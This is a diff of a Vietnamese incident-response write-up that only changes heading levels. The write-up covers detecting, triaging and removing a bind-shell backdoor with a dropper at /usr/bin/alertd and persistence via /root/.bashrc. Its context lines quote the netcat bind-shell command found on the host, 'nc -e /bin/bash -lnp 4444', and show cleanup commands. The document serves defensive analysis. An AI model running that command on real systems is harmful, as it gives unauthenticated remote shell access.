@@ -159,11 +159,13 @@ rm /root/.ssh/authorized_keys (là một Issue)
 # Xóa script Python backdoor
 rm /lib/python3/dist-packages/initiate-pyshell
 ```
-**Issue 1 (Bind shell 4444 + persistence qua /root/.bashrc + dropper /usr/bin/alertd)**
+---
+
+## Issue 1 (Bind shell 4444 + persistence qua /root/.bashrc + dropper /usr/bin/alertd)**
 
 ---
 
-## 1) Cách phát hiện (Detection)
+### 1) Cách phát hiện (Detection)
 
 ### 1.1. Nghi vấn có cổng lạ đang mở (listen)
 
@@ -213,7 +215,7 @@ port=4444  inode=59233904 pid=194 cmd=nc -e /bin/bash -lnp 4444
 
 ---
 
-## 2) Phân tích vì sao nguy hiểm (Impact / Risk)
+### 2) Phân tích vì sao nguy hiểm (Impact / Risk)
 
 ### 2.1. `nc -e /bin/bash -lnp 4444` là gì?
 
@@ -235,7 +237,7 @@ port=4444  inode=59233904 pid=194 cmd=nc -e /bin/bash -lnp 4444
 
 ---
 
-## 3) Lần dấu xem ai spawn ra `nc` (Triage / Root cause)
+### 3) Lần dấu xem ai spawn ra `nc` (Triage / Root cause)
 
 ### 3.1. Xem PPID của các tiến trình `nc`
 
@@ -275,7 +277,7 @@ PID  PPID USER ELAPSED CMD
 
 ---
 
-## 4) Phân tích backdoor file `/usr/bin/alertd`
+### 4) Phân tích backdoor file `/usr/bin/alertd`
 
 ```bash
 ls -la /usr/bin/alertd
@@ -294,7 +296,7 @@ nc -e /bin/bash -lnp 4444
 
 ---
 
-## 5) Tìm persistence: cái gì auto-run `alertd`?
+### 5) Tìm persistence: cái gì auto-run `alertd`?
 
 Quét các file chạy khi login/mở shell (profile/bashrc):
 
@@ -316,7 +318,7 @@ Quét các file chạy khi login/mở shell (profile/bashrc):
 
 ---
 
-## 6) Cách giải quyết (Remediation) — chi tiết, dễ hiểu
+### 6) Cách giải quyết (Remediation) — chi tiết, dễ hiểu
 
 ### 6.1. Gỡ persistence trong `/root/.bashrc`
 
